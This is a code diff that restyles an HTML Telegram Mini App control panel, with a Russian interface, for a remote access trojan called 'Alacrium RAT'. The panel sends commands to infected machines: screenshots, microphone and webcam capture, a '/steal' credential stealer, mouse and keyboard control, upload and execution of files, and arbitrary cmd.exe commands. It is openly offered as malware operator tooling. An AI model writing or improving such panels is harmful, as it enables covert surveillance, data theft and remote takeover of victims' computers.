@@ -1,61 +1,415 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RAT Control</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Alacrium RAT Panel</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: Arial; padding: 20px; background: #1e1e2e; color: #fff; }
-        .btn { background: #2a2a3e; border: none; color: #fff; padding: 12px; border-radius: 8px; margin: 6px; width: 100%; cursor: pointer; }
-        .btn:hover { background: #3a3a5e; }
-        input, select { width: 100%; padding: 10px; margin: 6px 0; border-radius: 6px; border: none; background: #2a2a3e; color: #fff; }
-        .result { background: #0a0a1a; padding: 10px; border-radius: 6px; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0a0e17;
+            color: #e0e6f0;
+            padding: 16px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            width: 100%;
+            padding-bottom: 30px;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 0 20px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .status-badge {
+            background: rgba(0, 212, 255, 0.12);
+            color: #00d4ff;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            letter-spacing: 0.3px;
+        }
+
+        /* Cards */
+        .card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 16px 18px;
+            margin-bottom: 16px;
+            transition: all 0.2s ease;
+        }
+
+        .card-title {
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: rgba(255, 255, 255, 0.35);
+            margin-bottom: 12px;
+        }
+
+        .card-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+
+        .card-grid .btn {
+            width: 100%;
+        }
+
+        /* Buttons */
+        .btn {
+            background: rgba(255, 255, 255, 0.06);
+            border: none;
+            border-radius: 12px;
+            padding: 12px 14px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #e0e6f0;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            text-align: center;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn:active {
+            transform: scale(0.96);
+            background: rgba(255, 255, 255, 0.10);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #0066ff, #7b2ffc);
+            color: #fff;
+            font-weight: 600;
+            box-shadow: 0 4px 15px rgba(0, 102, 255, 0.25);
+        }
+
+        .btn-primary:active {
+            background: linear-gradient(135deg, #0055dd, #6a1fcb);
+        }
+
+        .btn-danger {
+            background: rgba(255, 50, 80, 0.15);
+            color: #ff4466;
+            border: 1px solid rgba(255, 50, 80, 0.15);
+        }
+
+        .btn-danger:active {
+            background: rgba(255, 50, 80, 0.25);
+        }
+
+        .btn-success {
+            background: rgba(0, 200, 100, 0.12);
+            color: #00cc77;
+            border: 1px solid rgba(0, 200, 100, 0.10);
+        }
+
+        .btn-success:active {
+            background: rgba(0, 200, 100, 0.20);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.10);
+        }
+
+        .btn-outline:active {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .btn-icon {
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        /* Inputs */
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 4px;
+        }
+
+        .input-group label {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.50);
+            font-weight: 500;
+        }
+
+        .input-row {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .input-row .btn {
+            flex: 0 0 auto;
+            width: auto;
+            padding: 10px 16px;
+        }
+
+        input[type="text"],
+        input[type="number"] {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            padding: 12px 14px;
+            font-size: 14px;
+            color: #e0e6f0;
+            width: 100%;
+            outline: none;
+            transition: border 0.2s ease;
+            font-family: inherit;
+        }
+
+        input:focus {
+            border-color: rgba(0, 102, 255, 0.40);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.25);
+        }
+
+        .input-small {
+            flex: 1;
+        }
+
+        /* Log / Result */
+        .log {
+            background: rgba(0, 0, 0, 0.40);
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-family: 'SF Mono', 'Menlo', 'Consolas', monospace;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.60);
+            min-height: 60px;
+            max-height: 140px;
+            overflow-y: auto;
+            line-height: 1.6;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            word-break: break-word;
+            white-space: pre-wrap;
+        }
+
+        .log-empty {
+            color: rgba(255, 255, 255, 0.20);
+            font-style: italic;
+        }
+
+        /* Scrollbar */
+        .log::-webkit-scrollbar {
+            width: 4px;
+        }
+        .log::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .log::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 10px;
+        }
+
+        /* Responsive */
+        @media (max-width: 420px) {
+            body { padding: 12px; }
+            .card { padding: 14px; }
+            .btn { font-size: 13px; padding: 10px 12px; }
+            .header h1 { font-size: 17px; }
+        }
     </style>
 </head>
 <body>
-    <h2>🔹 RAT Panel</h2>
-    <button class="btn" onclick="sendCmd('/screenshot')">📸 Screenshot</button>
-    <button class="btn" onclick="sendCmd('/webcam')">📷 Webcam (demo)</button>
-    <button class="btn" onclick="sendCmd('/mic')">🎤 Mic (10s)</button>
-    <button class="btn" onclick="sendCmd('/steal')">💾 Steal All</button>
-    <hr>
-    <h3>Mouse</h3>
-    <input type="number" id="mx" placeholder="X" value="100">
-    <input type="number" id="my" placeholder="Y" value="100">
-    <button class="btn" onclick="sendCmd('/mouse ' + document.getElementById('mx').value + ' ' + document.getElementById('my').value)">Move</button>
-    <button class="btn" onclick="sendCmd('/mouse 0 0 0')">Left Click</button>
-    <button class="btn" onclick="sendCmd('/mouse 0 0 1')">Right Click</button>
-    <hr>
-    <h3>Keyboard</h3>
-    <input type="text" id="kbtext" placeholder="Text to type">
-    <button class="btn" onclick="sendCmd('/keyboard ' + document.getElementById('kbtext').value)">Type</button>
-    <hr>
-    <h3>Run File</h3>
-    <input type="text" id="runpath" placeholder="Full path to exe">
-    <button class="btn" onclick="sendCmd('/run ' + document.getElementById('runpath').value)">Run</button>
-    <button class="btn" onclick="sendCmd('/upload')">📤 Upload file to PC</button>
-    <button class="btn" onclick="sendCmd('/run_uploaded')">▶️ Run uploaded file</button>
-    <hr>
-    <h3>Command</h3>
-    <input type="text" id="cmd" placeholder="cmd.exe command">
-    <button class="btn" onclick="sendCmd('/exec ' + document.getElementById('cmd').value)">Execute</button>
-    <hr>
-    <button class="btn" onclick="sendCmd('/exit')" style="background:#a00;">⛔ Exit RAT</button>
-    <hr>
-    <div id="result" class="result">Ready...</div>
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
 
-        function sendCmd(cmd) {
-            if (!cmd) return;
-            document.getElementById('result').innerText = '⏳ Sending: ' + cmd;
-            // Отправляем команду через web_app_data
-            tg.sendData(cmd);
-            // Ответы будут приходить в чат
-            document.getElementById('result').innerText = '✅ Command sent: ' + cmd;
+<div class="container">
+
+    <!-- Header -->
+    <div class="header">
+        <h1>⚡ Alacrium</h1>
+        <span class="status-badge">● LIVE</span>
+    </div>
+
+    <!-- Quick Actions -->
+    <div class="card">
+        <div class="card-title">📡 Быстрые команды</div>
+        <div class="card-grid">
+            <button class="btn btn-primary" onclick="sendCmd('/screenshot')">📸 Скриншот</button>
+            <button class="btn btn-outline" onclick="sendCmd('/mic')">🎤 Микрофон</button>
+            <button class="btn btn-outline" onclick="sendCmd('/steal')">💾 Стиллер</button>
+            <button class="btn btn-outline" onclick="sendCmd('/webcam')">📷 Веб-камера</button>
+        </div>
+    </div>
+
+    <!-- Mouse -->
+    <div class="card">
+        <div class="card-title">🖱️ Мышь</div>
+        <div class="input-group">
+            <div class="input-row">
+                <input type="number" id="mx" class="input-small" placeholder="X" value="100">
+                <input type="number" id="my" class="input-small" placeholder="Y" value="100">
+                <button class="btn btn-primary" onclick="sendMouseMove()">Переместить</button>
+            </div>
+            <div class="input-row">
+                <button class="btn btn-outline" onclick="sendCmd('/mouse 0 0 0')">🖱️ Левый клик</button>
+                <button class="btn btn-outline" onclick="sendCmd('/mouse 0 0 1')">🖱️ Правый клик</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Keyboard -->
+    <div class="card">
+        <div class="card-title">⌨️ Клавиатура</div>
+        <div class="input-group">
+            <div class="input-row">
+                <input type="text" id="kbtext" placeholder="Введите текст для ввода...">
+                <button class="btn btn-primary" onclick="sendKeyboard()">Ввести</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Run & Upload -->
+    <div class="card">
+        <div class="card-title">📂 Запуск файлов</div>
+        <div class="input-group">
+            <div class="input-row">
+                <input type="text" id="runpath" placeholder="C:\\путь\\к\\файлу.exe">
+                <button class="btn btn-success" onclick="sendRun()">▶️ Запустить</button>
+            </div>
+            <div class="input-row" style="gap: 6px;">
+                <button class="btn btn-outline" onclick="sendCmd('/upload')" style="flex:1;">📤 Загрузить файл</button>
+                <button class="btn btn-success" onclick="sendCmd('/run_uploaded')" style="flex:1;">▶️ Запустить загруженный</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Command -->
+    <div class="card">
+        <div class="card-title">💻 Команда (cmd)</div>
+        <div class="input-group">
+            <div class="input-row">
+                <input type="text" id="cmd" placeholder="whoami / ipconfig ...">
+                <button class="btn btn-primary" onclick="sendCommand()">Выполнить</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mini App button (re-open) -->
+    <button class="btn btn-outline" onclick="sendCmd('/miniapp')" style="margin-bottom: 16px;">
+        🔄 Показать кнопку Mini App
+    </button>
+
+    <!-- Exit -->
+    <button class="btn btn-danger" onclick="sendCmd('/exit')" style="margin-bottom: 16px;">
+        ⛔ Остановить RAT
+    </button>
+
+    <!-- Log -->
+    <div class="card" style="margin-bottom: 0;">
+        <div class="card-title">📋 Лог</div>
+        <div id="log" class="log"><span class="log-empty">Готов к работе...</span></div>
+    </div>
+
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+
+    const logElement = document.getElementById('log');
+
+    function log(message) {
+        if (message === undefined || message === null) return;
+        const timestamp = new Date().toLocaleTimeString();
+        const entry = `[${timestamp}] ${message}`;
+        // Убираем плейсхолдер, если он есть
+        if (logElement.querySelector('.log-empty')) {
+            logElement.innerHTML = '';
         }
-    </script>
+        logElement.textContent += entry + '\n';
+        logElement.scrollTop = logElement.scrollHeight;
+    }
+
+    function sendCmd(cmd) {
+        if (!cmd) return;
+        log('➜ ' + cmd);
+        tg.sendData(cmd);
+    }
+
+    function sendMouseMove() {
+        const x = document.getElementById('mx').value || 0;
+        const y = document.getElementById('my').value || 0;
+        sendCmd('/mouse ' + x + ' ' + y);
+    }
+
+    function sendKeyboard() {
+        const text = document.getElementById('kbtext').value;
+        if (text) {
+            sendCmd('/keyboard ' + text);
+            document.getElementById('kbtext').value = '';
+        } else {
+            log('⚠️ Введите текст');
+        }
+    }
+
+    function sendRun() {
+        const path = document.getElementById('runpath').value;
+        if (path) {
+            sendCmd('/run ' + path);
+            document.getElementById('runpath').value = '';
+        } else {
+            log('⚠️ Укажите путь к файлу');
+        }
+    }
+
+    function sendCommand() {
+        const cmd = document.getElementById('cmd').value;
+        if (cmd) {
+            sendCmd('/exec ' + cmd);
+            document.getElementById('cmd').value = '';
+        } else {
+            log('⚠️ Введите команду');
+        }
+    }
+
+    // Приветствие
+    log('✅ Панель Alacrium RAT загружена');
+    log('💡 Отправляйте команды через кнопки или ввод');
+</script>
 </body>
 </html>
